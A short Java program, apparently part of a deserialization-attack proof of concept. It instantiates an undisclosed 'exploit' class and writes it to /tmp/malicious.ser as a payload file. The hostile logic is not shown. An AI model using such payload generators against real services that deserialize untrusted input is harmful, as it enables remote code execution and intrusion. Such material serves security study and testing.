import java.io.*;

public class ser {
    public static void main(String [] args) {
        exploit e=new exploit();
        try {
            FileOutputStream fileOut =
                    new FileOutputStream("/tmp/malicious.ser");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(e);
            out.close();
            fileOut.close();
            System.out.printf("Serialized data is saved in /tmp/malicious.ser");
        } catch (IOException i) {
            i.printStackTrace();
        }
    }
}